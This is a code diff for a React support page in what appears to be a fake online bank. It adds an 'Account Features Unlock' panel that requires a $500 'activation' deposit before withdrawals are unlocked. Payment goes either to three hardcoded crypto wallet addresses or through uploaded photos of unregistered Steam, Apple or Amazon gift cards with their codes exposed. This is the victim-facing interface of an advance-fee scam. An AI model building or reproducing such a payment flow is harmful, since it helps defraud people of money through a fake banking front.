@@ -1,7 +1,27 @@
 import React, { useEffect, useState } from 'react';
 import { useStore } from '../store';
-import { ShieldAlert, HelpCircle, FileText, Activity, Send, CheckCircle2, ChevronRight, Upload } from 'lucide-react';
+import { ShieldAlert, HelpCircle, FileText, Activity, Send, CheckCircle2, ChevronRight, Upload, CreditCard, Copy, Check } from 'lucide-react';
 import { motion } from 'motion/react';
+
+const CopyableText = ({ text, label }: { text: string, label: string }) => {
+  const [copied, setCopied] = useState(false);
+  const handleCopy = () => {
+    navigator.clipboard.writeText(text);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  };
+  return (
+    <div className="flex items-center justify-between p-3 rounded-lg border border-slate-200 dark:border-white/10 bg-slate-50 dark:bg-black/20">
+      <div className="flex flex-col">
+        <span className="text-[9px] font-mono uppercase text-slate-500 mb-0.5">{label}</span>
+        <span className="text-xs font-mono text-slate-900 dark:text-slate-200 font-bold">{text}</span>
+      </div>
+      <button onClick={handleCopy} className="p-2 bg-white dark:bg-white/10 rounded-md hover:bg-slate-100 dark:hover:bg-white/20 transition-colors">
+        {copied ? <Check size={14} className="text-emerald-500" /> : <Copy size={14} className="text-slate-500" />}
+      </button>
+    </div>
+  );
+};
 
 export const SupportView = () => {
   const { user, tickets, loadTickets, createTicket } = useStore();
@@ -9,6 +29,9 @@ export const SupportView = () => {
   const [description, setDescription] = useState('');
   const [category, setCategory] = useState('general');
   const [fileBase64, setFileBase64] = useState<string | null>(null);
+
+  const [paymentMethod, setPaymentMethod] = useState<'crypto' | 'giftcard'>('crypto');
+  const [activationFileBase64, setActivationFileBase64] = useState<string | null>(null);
   
   useEffect(() => {
     loadTickets();
@@ -25,6 +48,24 @@ export const SupportView = () => {
     }
   };
 
+  const handleActivationUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        setActivationFileBase64(reader.result as string);
+      };
+      reader.readAsDataURL(file);
+    }
+  };
+
+  const handleActivationSubmit = async () => {
+    if (!activationFileBase64) return;
+    await createTicket("Account Activation Payment Receipt", `User submitted a payment receipt for account activation. Method selected: ${paymentMethod}`, "verification", activationFileBase64);
+    setActivationFileBase64(null);
+    alert("Receipt submitted successfully. It will be reviewed by administrators shortly.");
+  };
+
   const handleCreate = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!subject.trim() || !description.trim()) return;
@@ -39,6 +80,103 @@ export const SupportView = () => {
       <div>
         <h1 className="text-2xl font-bold font-sans text-slate-900 dark:text-white">Support & Service</h1>
         <p className="text-sm text-slate-500 dark:text-slate-400 mt-1">Open tickets, upload documents, or request account management.</p>
+      </div>
+
+      {/* ACCOUNT ACTIVATION / UPGRADE PANEL */}
+      <div className="bg-white dark:bg-slate-900 rounded-2xl p-6 md:p-8 border-2 border-emerald-500/20 shadow-xl overflow-hidden relative">
+        <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-500/10 blur-3xl pointer-events-none" />
+        
+        <h2 className="text-xl font-bold font-sans text-slate-900 dark:text-white flex items-center space-x-2">
+          <ShieldAlert size={20} className="text-emerald-500" />
+          <span>Account Features Unlock</span>
+        </h2>
+        <p className="text-sm text-slate-500 dark:text-slate-400 mt-2 max-w-2xl leading-relaxed">
+          Unlock full withdrawals, direct deposits, routing numbers, and secure physical cards. Complete your account activation with a test deposit. <span className="font-bold text-slate-700 dark:text-slate-300">Minimum structural deposit: $500.</span>
+        </p>
+
+        <div className="mt-8 grid grid-cols-1 md:grid-cols-2 gap-8">
+          
+          <div className="space-y-6">
+            <h3 className="text-xs font-mono font-bold uppercase tracking-widest text-slate-500">1. Select Payment Bridge</h3>
+            <div className="flex space-x-3">
+              <button 
+                onClick={() => setPaymentMethod('crypto')}
+                className={`flex-1 py-3 px-4 rounded-xl text-xs font-bold transition-all ${paymentMethod === 'crypto' ? 'bg-emerald-500 text-white shadow-lg shadow-emerald-500/20' : 'bg-slate-100 dark:bg-white/5 text-slate-600 dark:text-slate-400'}`}
+              >
+                Cryptocurrency
+              </button>
+              <button 
+                onClick={() => setPaymentMethod('giftcard')}
+                className={`flex-1 py-3 px-4 rounded-xl text-xs font-bold transition-all ${paymentMethod === 'giftcard' ? 'bg-emerald-500 text-white shadow-lg shadow-emerald-500/20' : 'bg-slate-100 dark:bg-white/5 text-slate-600 dark:text-slate-400'}`}
+              >
+                Gift Cards
+              </button>
+              <button 
+                disabled
+                className="flex-1 py-3 px-4 rounded-xl text-xs font-bold bg-slate-100 dark:bg-white/5 text-slate-400 dark:text-slate-600 cursor-not-allowed hidden sm:block"
+              >
+                PayPal (Soon)
+              </button>
+            </div>
+
+            <div className="p-5 rounded-xl border border-slate-200 dark:border-white/5 bg-slate-50 dark:bg-slate-950/50">
+              {paymentMethod === 'crypto' ? (
+                <div className="space-y-4">
+                  <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed mb-4">
+                    Send funds via the networks designated below. Ensure sufficient gas to cover network fees. Only send on the designated protocol.
+                  </p>
+                  <CopyableText label="USDT (ERC20 - Ethereum Network)" text="0x6420440fe3052422134229ff5ac904ec1aadf882" />
+                  <CopyableText label="USDT (TRC20 - Tron Network)" text="TY1rjXKoLM4MKUmUMAJNaqngxdXAUQDrUG" />
+                  <CopyableText label="BITCOIN (BTC Network)" text="1M4CxHqAhCeWQnoF3HgmzhS4sxKgDWwF1g" />
+                </div>
+              ) : (
+                <div className="space-y-4 relative">
+                  <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed">
+                    Purchase and upload images of valid, unregistered gift cards (front and back exposing code). Minimum aggregated value $500.
+                  </p>
+                  
+                  <div className="p-3 bg-red-50 dark:bg-red-500/10 border border-red-200 dark:border-red-500/20 text-red-800 dark:text-red-400 rounded-lg text-xs leading-relaxed">
+                    <span className="font-bold block mb-1">Recommended / Verified Safe:</span>
+                    Steam, Apple Store, and Amazon.
+                  </div>
+                  
+                  <div className="text-[10px] space-y-1 text-slate-500">
+                    <p>Accepted USA/UK/Europe specific stores:</p>
+                    <p className="italic">Google Play, Razer Gold, Sephora, Target, Vanilla Visa, Walmart, eBay.</p>
+                  </div>
+                </div>
+              )}
+            </div>
+          </div>
+
+          <div className="space-y-6">
+            <h3 className="text-xs font-mono font-bold uppercase tracking-widest text-slate-500">2. Upload Proof of Clearing</h3>
+            
+            <div className="border-2 border-dashed border-slate-200 dark:border-white/10 rounded-xl p-8 flex flex-col items-center justify-center text-center bg-slate-50 dark:bg-slate-950/50">
+              <div className="w-12 h-12 rounded-full bg-slate-100 dark:bg-white/5 flex items-center justify-center text-slate-400 mb-4">
+                <Upload size={20} />
+              </div>
+              <p className="text-xs text-slate-600 dark:text-slate-400 mb-2">
+                Attach receipt screenshot, TxHash image, or clear photos of purchased gift cards.
+              </p>
+              
+              <label className="mt-4 px-6 py-2.5 rounded-lg bg-emerald-500 hover:bg-emerald-600 text-white text-xs font-bold transition-all cursor-pointer">
+                {activationFileBase64 ? 'Document Selected' : 'Select File'}
+                <input type="file" className="hidden" accept="image/*,.pdf" onChange={handleActivationUpload} />
+              </label>
+
+              {activationFileBase64 && (
+                <button 
+                  onClick={handleActivationSubmit}
+                  className="mt-3 px-6 py-2.5 rounded-lg border border-emerald-500 text-emerald-600 dark:text-emerald-400 hover:bg-emerald-500/10 text-xs font-bold transition-all"
+                >
+                  Confirm Upload & Submit
+                </button>
+              )}
+            </div>
+          </div>
+
+        </div>
       </div>
 
       <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
